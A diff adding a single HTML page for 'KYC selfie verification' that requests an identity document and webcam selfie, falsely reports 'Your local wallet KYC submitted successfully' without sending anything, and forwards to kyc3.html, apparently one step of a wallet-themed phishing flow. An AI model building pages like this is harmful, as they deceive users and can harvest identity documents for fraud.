@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KYC Selfie Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+        }
+        .kyc-container {
+            border: 2px solid #000;
+            padding: 20px;
+            display: inline-block;
+            background-color: #f4f4f4;
+            border-radius: 10px;
+        }
+        input, button {
+            margin-top: 10px;
+            padding: 10px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        video {
+            width: 100%;
+            max-width: 400px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="kyc-container">
+        <h2>KYC Selfie Verification</h2>
+        <p>Upload your identity document:</p>
+        <input type="file" id="kycImage" accept="image/*">
+        <p>Take a selfie for verification:</p>
+        <video id="video" autoplay></video>
+        <br>
+        <button onclick="captureSelfie()">Capture Selfie</button>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <br>
+        <button onclick="submitKYC()">Submit</button>
+        <p id="message"></p>
+    </div>
+
+    <script>
+        let video = document.getElementById("video");
+        let canvas = document.getElementById("canvas");
+        let context = canvas.getContext("2d");
+        
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("Error accessing camera: ", err);
+            });
+        
+        function captureSelfie() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        }
+
+        function submitKYC() {
+            let fileInput = document.getElementById("kycImage");
+            let message = document.getElementById("message");
+            
+            if (fileInput.files.length === 0) {
+                message.textContent = "Please upload an identity document.";
+                return;
+            }
+            
+            let selfieData = canvas.toDataURL("image/png");
+            if (!selfieData) {
+                message.textContent = "Please capture a selfie.";
+                return;
+            }
+            
+            message.textContent = "Your local wallet KYC submitted successfully! we get back to you as soon as possible within 24 hours Thanks";
+        }
+    </script> <form action="kyc3.html" method="get">
+    <button type="submit">Submit</button>
+</form>
+</body>
+</html>
